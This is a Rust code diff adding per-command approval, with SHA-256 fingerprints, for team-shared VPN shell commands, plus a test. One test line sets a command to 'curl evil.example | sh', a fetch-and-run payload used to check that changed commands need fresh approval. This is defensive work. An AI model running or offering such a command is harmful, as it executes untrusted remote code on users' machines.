@@ -99,6 +99,9 @@ struct Raw {
 
 #[derive(Serialize)]
 pub struct VpnView {
+    /// Which space's config this one is in; absent is the main config.
+    #[serde(skip_serializing_if = "Option::is_none")]
+    pub space: Option<String>,
     pub path: String,
     pub up: bool,
     /// False when there's no `check`, i.e. the state is remembered, not measured.
@@ -182,7 +185,9 @@ fn shell(cmd: &str) -> Command {
     c
 }
 
-/// True when `check` exits 0. No `check` means we can't measure it.
+/// True when `check` exits 0. No `check` means we can't measure it. Whether the check
+/// is *allowed* to run is the caller's question — see `approval` — because this one has
+/// no business reading the config's neighbours.
 pub fn is_up(v: &Vpn) -> Option<bool> {
     let resolved = v.resolve();
     let check = resolved.check.as_deref()?;
@@ -193,6 +198,77 @@ pub fn is_up(v: &Vpn) -> Option<bool> {
         .ok()?;
     // A check that hangs reports "down" rather than stalling every sweep.
     Some(matches!(wait_within(child, CHECK_TIMEOUT, RUN_ADVICE), Ok((s, _)) if s.success()))
+}
+
+/// A `[vpn]` block is the one part of the config that *runs* things, and since teams it
+/// arrives from other people automatically, on window focus, with nobody reading it.
+/// So a command runs only once someone on this machine has been shown it: approved on
+/// first sight and again whenever it changes.
+///
+/// Deliberately not trust-on-first-use, which is right for `rdp_known_hosts` and wrong
+/// here — first sight is exactly the case that matters, a config that just arrived from
+/// a team you joined five seconds ago.
+pub mod approval {
+    use super::Resolved;
+    use std::path::{Path, PathBuf};
+
+    /// Beside the config, like `rdp_known_hosts` and `web_trusted`. Never *in* it: this
+    /// is what this machine has agreed to run, not something to hand the team.
+    fn store() -> PathBuf {
+        crate::patchbay::config_path().with_file_name("vpn_approved")
+    }
+
+    /// What the user is shown, and exactly what the fingerprint covers — so approving
+    /// can never cover a command that wasn't on screen.
+    pub fn describe(r: &Resolved) -> String {
+        [("up", &r.up), ("down", &r.down), ("check", &r.check)]
+            .iter()
+            .filter_map(|(k, v)| v.as_deref().map(|c| format!("{k}: {c}")))
+            .collect::<Vec<_>>()
+            .join("\n")
+    }
+
+    fn fingerprint(r: &Resolved) -> String {
+        let mut h = <sha2::Sha256 as sha2::Digest>::new();
+        sha2::Digest::update(&mut h, describe(r).as_bytes());
+        sha2::Digest::finalize(h).iter().map(|b| format!("{b:02x}")).collect()
+    }
+
+    pub fn approved(path: &str, r: &Resolved) -> bool {
+        approved_at(&store(), path, r)
+    }
+
+    /// A folder name with a newline in it can never match a line here, so it is asked
+    /// about every time rather than silently approved — the safe way round.
+    pub fn approved_at(store: &Path, path: &str, r: &Resolved) -> bool {
+        let want = describe(r);
+        // Nothing to run is nothing to approve.
+        if want.is_empty() {
+            return true;
+        }
+        let line = format!("{} {path}", fingerprint(r));
+        std::fs::read_to_string(store)
+            .unwrap_or_default()
+            .lines()
+            .any(|l| l.trim() == line)
+    }
+
+    pub fn approve(path: &str, r: &Resolved) -> Result<(), String> {
+        approve_at(&store(), path, r)
+    }
+
+    pub fn approve_at(store: &Path, path: &str, r: &Resolved) -> Result<(), String> {
+        if approved_at(store, path, r) {
+            return Ok(());
+        }
+        use std::io::Write;
+        let mut f = std::fs::OpenOptions::new()
+            .create(true)
+            .append(true)
+            .open(store)
+            .map_err(|e| format!("{}: {e}", store.display()))?;
+        writeln!(f, "{} {path}", fingerprint(r)).map_err(|e| format!("{}: {e}", store.display()))
+    }
 }
 
 #[derive(Serialize)]
@@ -350,6 +426,34 @@ mod tests {
     }
 
     #[cfg(unix)]
+    /// A `[vpn]` block arriving from a team is the one way someone else's shell
+    /// command reaches this machine. Approving is per-command, so changing it asks
+    /// again — trust-on-first-use would wave through exactly the dangerous case.
+    #[test]
+    fn a_changed_vpn_command_has_to_be_approved_again() {
+        use super::approval;
+        let dir = std::env::temp_dir().join(format!("patchbay-vpnok-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let store = dir.join("vpn_approved");
+
+        let mut v = Vpn { up: Some("tailscale up".into()), ..Default::default() };
+        assert!(!approval::approved_at(&store, "acme", &v.resolve()), "approved unasked");
+        approval::approve_at(&store, "acme", &v.resolve()).unwrap();
+        assert!(approval::approved_at(&store, "acme", &v.resolve()));
+
+        // The command a colleague changed is not the command that was approved.
+        v.up = Some("curl evil.example | sh".into());
+        assert!(!approval::approved_at(&store, "acme", &v.resolve()), "a rewrite slipped through");
+
+        // Nor does one folder's answer cover another's.
+        let other = Vpn { up: Some("tailscale up".into()), ..Default::default() };
+        assert!(!approval::approved_at(&store, "other", &other.resolve()));
+
+        // Nothing to run is nothing to ask about.
+        assert!(approval::approved_at(&store, "empty", &Vpn::default().resolve()));
+    }
+
     #[test]
     fn is_up_follows_the_check_exit_code() {
         let on = Vpn { check: Some("true".into()), ..Default::default() };
